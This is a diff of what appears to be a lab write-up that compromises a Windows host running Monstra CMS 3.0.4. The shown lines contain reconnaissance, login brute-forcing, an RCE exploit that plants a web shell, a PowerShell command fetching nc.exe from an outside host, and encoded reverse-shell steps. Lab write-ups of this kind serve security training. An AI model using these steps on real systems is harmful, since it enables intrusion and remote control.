@@ -8,9 +8,9 @@
 
 > nmap -Pn -O -oN nmap.txt -sV -sC -p- --open 192.168.243.180
 
-![](image_2.png)
-![](image_3.png)
-![](image_10.png)
+![](https://github.com/user-attachments/assets/16dbbbb0-99bd-453b-9b8b-9284ff265d7d)
+![](https://github.com/user-attachments/assets/d8cd13a4-8404-43f6-8eb3-b59f019f219f)
+![](https://github.com/user-attachments/assets/40bdf129-2e59-452d-a438-0f723c575e12)
 
 - 135, 139, 445, openssl 1.1.1c, 3389, 5040, 7680, 49664~49669
 
@@ -20,7 +20,7 @@
 
 > ffuf -u http://192.168.243.180 -H "Host:FUZZ.192.168.243.180" -w /usr/share/seclists/Discovery/DNS/namelist.txt
 
-![](image_5.png)
+![](https://github.com/user-attachments/assets/ce24a810-aa5a-40ea-b687-0bb6b11a4545)
 
 ## curl
 
@@ -29,13 +29,13 @@
 - assets path found
 - accesssable assets path
 
-![](image.png)
+![](https://github.com/user-attachments/assets/3425664b-5071-4c08-b234-f2de9e142d8c)
 
 > curl 192.168.243.180/assets
 
 - 301
 
-![](image_1.png)
+![](https://github.com/user-attachments/assets/a3c96884-9250-4d33-97cd-d69a151bcf3e)
 
 ## mitmproxy
 
@@ -54,33 +54,33 @@ def response(flow: http.HTTPFlow):
 > mitmproxy -s remove_location.py -p 80
 > curl -x http://127.0.0.1:80 http://192.168.243.180/assets
 
-![](image_4.png)
+![](https://github.com/user-attachments/assets/7a3d6891-e0eb-4994-bf5a-c02e45ff6335)
 
 > curl -x http://127.0.0.1:80 http://192.168.243.180/assets/
 
 - accessable assets path
 -
 
-![](image_6.png)
+![](https://github.com/user-attachments/assets/8690c5ce-d443-4327-bb0f-0efe8ddcbd0e)
 
 > curl -x http://127.0.0.1:80 http://192.168.243.180/icons/back.gif
 
 Kevin Hughes, Kevinh@eit.com, September 1995
 
-![](image_8.png)
+![](https://github.com/user-attachments/assets/1651d4dd-019c-4936-be4c-6b77f350aec7)
 
 > curl -X GET -x http://127.0.0.1:80 http://192.168.243.180/assets/icons/folder.gif -O
 
 mailto:postmaster@localhost -> webmaster
 <span>Apache/2.4.41 (Win64) OpenSSL/1.1.1c PHP/7.3.10</span>
 
-![](image_7.png)
+![](https://github.com/user-attachments/assets/7c3d9cdf-d2cf-40f6-ac52-4928352d72aa)
 
 ## openssl 1.1.1c -> BOF -> not matching beacuase it is a vulnerability for game of half-life
 
 /usr/share/exploitdb/exploits/linux/remote/22968.c
 
-![](image_9.png)
+![](https://github.com/user-attachments/assets/6a3e475c-2aa7-497e-a0f8-4eb150ffb82c)
 
 ## 443
 
@@ -88,7 +88,7 @@ mailto:postmaster@localhost -> webmaster
 
 > ffuf -u http://192.168.243.180/FUZZ -w /usr/share/seclists/Discovery/Web-Content/big.txt -t 50 -fc 403
 
-![](image_11.png)
+![](https://github.com/user-attachments/assets/8ae2affd-b5db-46fa-b442-62c33de32778)
 
 - blog, assets
 
@@ -96,7 +96,7 @@ mailto:postmaster@localhost -> webmaster
 
 > curl http://192.168.243.180/blog/
 
-![](image_12.png)
+![](https://github.com/user-attachments/assets/3e068ecf-1023-4825-87b9-0128c6023f58)
 
 - Monstra 3.0.4
 
@@ -104,7 +104,7 @@ mailto:postmaster@localhost -> webmaster
 
 - found 3.0.4 -> 6
 
-![](image_13.png)
+![](https://github.com/user-attachments/assets/1cc24991-5b6a-48c2-af30-b000757586ad)
 
 Monstra CMS 3.0.4 - Remote Code Execution (Authenticated) | php/webapps/49949.py
 Monstra CMS 3.0.4 - Remote Code Execution (RCE) | php/webapps/52038.py
@@ -159,12 +159,12 @@ anonymous smbclient
 Password for [WORKGROUP\root]:
 session setup failed: NT_STATUS_ACCESS_DENIED
 
-![](image_14.png)
+![](https://github.com/user-attachments/assets/3ec88753-6c82-46d2-a67b-fbbbe62928f0)
 
 smbclient -L //192.168.243.180 -N
 session setup failed: NT_STATUS_ACCESS_DENIED
 
-![](image_15.png)
+![](https://github.com/user-attachments/assets/47801d7c-c63e-49e0-ab2a-10036d79bea3)
 
 > sudo apt install -y python3-impacket
 > python3 /usr/share/doc/python3-impacket/examples/rpcdump.py @192.168.243.180 | tee rpc
@@ -173,21 +173,21 @@ session setup failed: NT_STATUS_ACCESS_DENIED
 
 TCP connection successs but! can not access with anonymous
 
-![](image_16.png)
+![](https://github.com/user-attachments/assets/682a5d96-3d87-428f-9774-6c9790183c3e)
 
 > smbclient -L //192.168.243.180 -N -p 139
 > nmap -p139,445 --script smb-protocols 192.168.243.180
 
 version >= 2 -> so not used smb1
 
-![](image_17.png)
+![](https://github.com/user-attachments/assets/e31b4ce7-91ab-42e9-8375-3c0f7829f936)
 
 > apt install netexec
 > nxc smb 192.168.243.180 -u '' -p '' --shares
 
 MIKE-PC -> evidence found
 
-![](image_26.png)
+![](https://github.com/user-attachments/assets/20972255-fe26-4148-afa0-8210d2500a12)
 
 > apt install httpie
 > http http://192.168.243.180/blog/
@@ -198,24 +198,24 @@ http://monster.pg/blog/users
 http://monster.pg/blog/users/login
 http://monster.pg/blog/users/registration
 
-![](image_19.png)
+![](https://github.com/user-attachments/assets/1762f739-80ad-4934-8a7f-0e26ebe3a8fe)
 
 > vim /etc/hosts
 > echo "192.168.243.180 monster.pg" >> /etc/hosts
 
-![](image_20.png)
+![](https://github.com/user-attachments/assets/623ed7c0-94e2-44dd-a76e-a31b08bccf90)
 
 > http http://monster.pg/blog/users/
 
-![](image_21.png)
+![](https://github.com/user-attachments/assets/bba1b548-105e-4d72-99a1-ae43309926dd)
 
 > http http://monster.pg/blog/users/login/
 
-![](image_22.png)
+![](https://github.com/user-attachments/assets/dbedd8d0-61f1-4b41-83c0-009cf80c69c9)
 
 > http://monster.pg/blog/users/registration/
 
-![](image_23.png)
+![](https://github.com/user-attachments/assets/35286681-c1fd-46e1-8800-9d2bc09eaa60)
 
 ## generate a custom words.txt file
 
@@ -227,7 +227,7 @@ http http://monster.pg/blog/users/login/
 
 csrf token needed...
 
-![](image_24.png)
+![](https://github.com/user-attachments/assets/81cf6e11-b507-4002-ab8f-9efce1910500)
 
 ./tmp/bruteforce_csrf_php.py
 /usr/share/seclists/Usernames/Names/names.txt
@@ -238,12 +238,12 @@ check fail message
 
 > python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users words.txt --passwords /usr/share/seclists/Passwords/Common-Credentials/xato-net-10-million-passwords-1000.txt -T 20
 
-![](image_25.png)
+![](https://github.com/user-attachments/assets/aaa17c32-012e-43a3-8413-47c89ea0ecea)
 
 > python3 bruteforce_csrf_php.py --url http://monster.pg/blog/users/login/ --users /usr/share
 > /seclists/Usernames/Names/names.txt --passwords words.txt -T 10
 
-![](image_27.png)
+![](https://github.com/user-attachments/assets/ed4a6dec-2682-401f-ad88-97c5338c550d)
 
 username: admin
 email: wazowski@monster.pg
@@ -251,7 +251,7 @@ registered: 22.2.2022
 
 > python3 52038.py http://monster.pg/blog admin wazowski
 
-![](image_28.png)
+![](https://github.com/user-attachments/assets/20e2bd5b-b114-4e1f-a7aa-da1ef623e94a)
 
 success
 
@@ -264,7 +264,7 @@ Your shell is ready: http://monster.pg/blog/public/themes/default/pixiq.chunk.ph
 
 mike-pc\mike
 
-![](image_29.png)
+![](https://github.com/user-attachments/assets/7cc53afb-235e-49b5-bb7e-a9d6754d16f9)
 
 > curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=whoami%20/priv"
 
@@ -291,9 +291,9 @@ ps#1
 
 > vim reverse.ps1
 
-![](image_30.png)
+![](https://github.com/user-attachments/assets/27d8989f-0b04-4c97-85ea-7f93f4f8fb46)
 
-![](image_31.png)
+![](https://github.com/user-attachments/assets/d5795445-b154-4592-ac40-c6edeea8e1c9)
 
 > curl "http://monster.pg/blog/public/themes/default/pixiq.chunk.php?cmd=powershell -c iwr -uri http://192.168.45.156/nc.exe -Outfile C:\Windows\Temp\nc.exe"
 
@@ -340,7 +340,7 @@ retry
 - 무반응
   원인은 Base64 인코딩 형식입니다. 지금 쓰는 Base64는 UTF-8이라 powershell -e가 기대하는 UTF-16LE가 아닙니다. revshells.com이 생성한 UTF-16LE Base64를 그대로 쓰거나, 직접 인코딩할 때 echo -n '...' | iconv -t UTF-16LE | base64 -w 0로 만들어야 합니다. UTF-8 Base64를 넣으면 PowerShell이 명령을 디코딩하지 못해 무반응입니다.
 
-![](image_32.png)
+![](https://github.com/user-attachments/assets/15be2710-9f01-4efa-bed8-71025d60ce0e)
 
 > curl -G "http://monster.pg/blog/public/themes/default/pixiq.chunk.php" --data-urlencode "cmd=powershell -e <REVSHells에서_복사한_BASE64>"
 
@@ -365,7 +365,7 @@ PS C:\xampp\htdocs\blog\public\themes\default>
 
 PS C:\xampp\htdocs\blog\public\themes\default>
 
-![](image_34.png)
+![](https://github.com/user-attachments/assets/a80eb30d-7c68-4447-84f0-41eac677bc72)
 
 Username: MIKE-PC\Administrator
 RunAs User: MIKE-PC\Administrator
@@ -382,7 +382,7 @@ Mode LastWriteTime Length Name
 
 PS C:\Users\Mike\Desktop> type local.txt
 
-![](image_35.png)
+![](https://github.com/user-attachments/assets/b52b857b-555a-488d-a57b-4817582f0379)
 
 get a local.txt flag
 
@@ -423,7 +423,7 @@ a2b4e80cd640aaa6e417febe095dcbfc
 
 C:\xampp\htdocs\blog\boot\defines.php
 
-![](image_36.png)
+![](https://github.com/user-attachments/assets/2020f02f-7d21-4253-b7cd-bb1e689e7689)
 
 ## salt -> "YOUR_SALT_HERE"
 
@@ -476,7 +476,7 @@ php 에서는 문자.문자 -> "문자문자" -> 붙음
 mike
 844ffc2c7150b93c4133a6ff2e1a2dba
 
-![](image_38.png)
+![](https://github.com/user-attachments/assets/52504d6b-1a7a-485c-82c3-4da9aa6671a9)
 
 ```txt
 Dictionary cache hit:
